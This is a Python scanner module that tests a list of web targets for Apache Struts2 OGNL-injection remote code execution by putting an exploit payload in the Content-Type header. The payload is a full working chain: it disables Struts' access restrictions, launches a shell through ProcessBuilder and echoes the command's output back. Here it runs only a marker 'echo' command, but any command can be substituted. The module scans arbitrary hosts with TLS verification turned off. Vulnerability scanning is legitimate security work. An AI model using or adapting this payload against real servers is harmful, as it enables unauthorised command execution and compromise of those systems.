import requests, os
from module.other import Other
from config import DEFAULT_TIMEOUT

class Apache2StrutsScanner:
    def __init__(self, args):
        self.args = args
        self.verbose = args.verbose
        self.targets = self._load_targets(args)
        self.payload = (
            "%{(#_='multipart/form-data')."
            "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
            "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
            "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
            "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
            "(#context.setMemberAccess(#dm))))."
            "(#cmd='echo checkvuln')."
            "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
            "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
            "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))."
            "(#process=#p.start())."
            "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
            "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())"
        )
        self.headers = {
            "Content-Type": self.payload,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"
        }
        self.timeout = DEFAULT_TIMEOUT
        self.module_name = os.path.splitext(os.path.basename(__file__))[0]
        self.printer = Other()

    def _load_targets(self, args):
        if os.path.exists(args.target):
            with open(args.target, "r") as f:
                return [line.strip() for line in f if line.strip()]
        return [args.target]

    def run(self):
        results = []
        for url in self.targets:
            try:
                r = requests.get(url, headers=self.headers, timeout=self.timeout, verify=False)
                is_vuln = "checkvuln" in r.text
                colored_url = self.printer.color_text(url, "yellow")
                status = self.printer.color_text("Vuln", "green") if is_vuln else self.printer.color_text("Not Vuln", "red")
                if self.verbose or is_vuln:
                    print(f"[*] [Module: {self.module_name}] [{status}] {colored_url}")
                if is_vuln:
                    results.append({"url": url, "vulnerable": True})
            except Exception as e:
                if self.verbose:
                    print(f"[!] Error accessing {url}: {str(e)}")
        return {"struts2_results": results}

def scan(args=None):
    return Apache2StrutsScanner(args).run()
